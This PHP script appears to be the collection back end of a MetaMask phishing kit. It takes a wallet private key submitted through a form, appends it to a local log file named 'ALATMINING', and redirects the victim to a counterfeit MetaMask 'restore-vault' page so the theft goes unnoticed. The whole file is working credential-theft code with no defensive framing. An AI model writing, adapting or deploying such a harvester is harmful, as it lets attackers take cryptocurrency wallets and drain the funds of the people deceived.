
<?php
$file = "ALATMINING";
$ip   = getenv("REMOTE_ADDR");
$PrivateKey   = $_POST['PrivateKey'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "LUNA MAYA :: ");
fwrite($handle, "$PrivateKey");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"metamask/home.html?nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault\";
// -->
</script>";
?>


